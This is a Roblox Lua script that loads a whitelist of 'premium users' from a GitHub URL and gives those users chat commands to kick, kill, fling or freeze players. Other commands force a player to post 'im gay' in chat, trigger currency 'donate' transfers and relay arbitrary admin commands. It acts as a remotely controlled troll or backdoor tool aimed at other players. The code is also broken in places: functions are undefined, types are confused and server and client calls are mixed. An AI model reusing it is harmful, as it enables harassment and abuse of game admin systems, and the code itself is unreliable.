
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local Debris = game:GetService("Debris")
local ChatEvents = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
local ChatSendAnySC = ReplicatedStorage:WaitForChild("ChatSendAnySC") -- Your custom remote event

local premiumUserUrls = 'https://raw.githubusercontent.com/Adam3mka/The-chosen-one-lukaku/refs/heads/main/Okay'
local premiumUsers = nil

-- Load premium users list from URL
local success, result = pcall(function()
    return HttpService:GetAsync(premiumUserUrls)
end)

if success and result then
    local decoded = HttpService:JSONDecode(result)
    premiumUsers = decoded
else
    warn("Failed to load premium users list.")
    premiumUsers = {}
end

local function isPremiumUser(player)
    for _, user in ipairs(premiumUsers) do
        if user and user.Name == player.Name then
            return true
        end
    end
    return false
end

local function handleChat(premiumUser)
    if not premiumUser then return end
    
    local function onMessage(data)
        local message = data.Message
        local senderUserId = data.SpeakerUserId
        local senderPlayer = Players:GetPlayerByUserId(senderUserId)
        if not senderPlayer then return end
        if senderPlayer ~= premiumUser then return end

        local character = senderPlayer.Character
        local hrp = character and character:FindFirstChild("HumanoidRootPart")
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        local upperTorso = character and character:FindFirstChild("UpperTorso")
        
        local function isNotSelf()
            return senderPlayer ~= Players.LocalPlayer
        end

        -- Command: .fling
        if message:match("^%.fling%s*%.") then
            if isNotSelf() and hrp then
                hrp.CFrame = CFrame.new(0, 999, 0)
                local power = 99999999
                for _, part in pairs(character:GetChildren()) do
                    if part:IsA("BasePart") then part.CanCollide = false end
                end
                local thrust = Instance.new("BodyThrust", hrp)
                thrust.Force = Vector3.new(power, 0, power)
                Debris:AddItem(thrust, 2)
            end
        -- Command: .freeze
        elseif message:match("^%.freeze%s*%.") then
            if isNotSelf() then freeze(character) end
        -- Command: .unfreeze
        elseif message:match("^%.unfreeze%s*%.") then
            if isNotSelf() then unfreeze(character) end
        -- Command: .kxck
        elseif message:match("^%.kxck%s*%.") then
            if isNotSelf() then senderPlayer:Kick("You have been kicked.") end
        -- Command: .oof
        elseif message:match("^%.oof%s*%.") then
            if isNotSelf() and humanoid then humanoid:Destroy() end
        -- Command: .error
        elseif message:match("^%.error%s*%.") then
            if isNotSelf() and hrp then hrp.CFrame = CFrame.new(99999, 99999, 99999) end
        -- Command: .bring
        elseif message:match("^%.bring%s*%.") then
            if isNotSelf() and upperTorso and senderPlayer.Character then
                local targetPos = senderPlayer.Character:FindFirstChild("UpperTorso") and senderPlayer.Character.UpperTorso.Position
                if targetPos and hrp then
                    hrp.CFrame = CFrame.new(targetPos + Vector3.new(0, 3, 0))
                end
            end
        -- Command: .sit
        elseif message:match("^%.sit%s*%.") then
            if isNotSelf() and humanoid then humanoid.Sit = true end
        -- Command: .unsit
        elseif message:match("^%.unsit%s*%.") then
            if isNotSelf() and humanoid then humanoid.Sit = false end
        -- Command: .troll
        elseif message:match("^%.troll%s*%.") then
            if isNotSelf() then
                ChatEvents.SayMessageRequest:FireServer("im gay", "All")
            end
        -- Command: .enlighten
        elseif message:match("^%.enlighten%s*%.") then
            if isNotSelf() and character then
                local tool = senderPlayer.Backpack:FindFirstChild("The Arkenstone")
                if tool then
                    tool:Equip()
                end
                game.Players:Chat(";enlighten " .. senderPlayer.Name)
            end
        -- Command: .donate
        elseif message:match("^%.donate%s+(.+)") then
            local amount = message:match("^%.donate%s+(.+)")
            if isNotSelf() then
                game.Players:Chat(";donate " .. amount .. " " .. senderPlayer.Name)
            end
        -- Command: .say
        elseif message:match("^%.say%s+(.+)") then
            local text = message:match("^%.say%s+(.+)")
            if isNotSelf() then
                ChatSendAnySC:FireServer(text)
            end
        -- Command: .cmd
        elseif message:match("^%.cmd%s+(.+)") then
            local cmdText = message:match("^%.cmd%s+(.+)")
            if isNotSelf() then
                game.Players:Chat(senderPlayer.Name, ";" .. cmdText)
            end
        -- Command: .cmdx (list commands)
        elseif message:match("^%.cmdx") then
            if senderPlayer == premiumUser then
                StarterGui:SetCore("SendNotification", {
                    Title = "Commands",
                    Text = ".freeze .bring .error .oof .kxck .fling .sit .unsit .troll .donate .say .enlighten .cmd",
                    Duration = 5,
                    Icon = "rbxassetid://999999999"
                })
            end
        end
    end
    ChatEvents.OnMessageDoneFiltering.OnServerEvent:Connect(onMessage)
end

for _, user in ipairs(premiumUsers) do
    handleChat(user)
end
